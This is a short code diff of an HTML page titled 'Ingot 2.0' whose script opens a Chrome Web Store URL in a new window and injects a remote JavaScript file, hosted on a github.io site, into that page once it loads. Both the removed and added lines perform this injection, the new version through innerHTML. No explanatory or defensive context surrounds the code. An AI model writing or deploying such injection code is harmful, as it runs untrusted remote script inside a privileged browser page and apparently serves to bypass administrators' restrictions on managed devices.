@@ -6,12 +6,8 @@
     <title>Ingot 2.0</title>
     <script>
         var webstore = window.open("https://chrome.google.com/webstorex");
-        webstore.location.replace("https://chrome.google.com/webstorex");
-        var injection = document.createElement('script');
-        injection.src = "https://tebothegebo.github.io/ingot-v2/inject.js";
-        webstore.onload = function() {
-            webstore.document.body.appendChild(injection);
-        }
+        webstore.location.refresh();
+        webstore.onload = function injection(){this.document.body.innerHTML += "<script src='https://tebothegebo.github.io/ingot-v2/inject.js'></script>";};
     </script>
 </head>
 <body>
